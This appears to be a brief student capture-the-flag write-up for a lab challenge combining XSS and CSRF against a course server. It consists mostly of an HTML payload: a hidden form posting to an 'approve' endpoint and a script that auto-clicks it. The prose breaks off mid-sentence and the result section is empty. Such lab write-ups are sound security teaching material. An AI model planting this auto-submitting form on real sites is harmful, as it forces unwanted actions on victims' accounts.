# CTF6 - XSS + CSRF

The primary objective of this Capture The Flag (CTF) challenge is to attack a website using XSS and CSRF, gaining access to the flag.

## The Exploit
Firstly, we need to ask  

```html
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/9c7588d96859932429857d41a44172902f25821a/approve" role="form">
<div class="submit">
<input type="submit" id="givetheflag" value="Give us the flag"> </div>
</form>
<script>document.getElementById("givetheflag").click();</script>```



## The Result
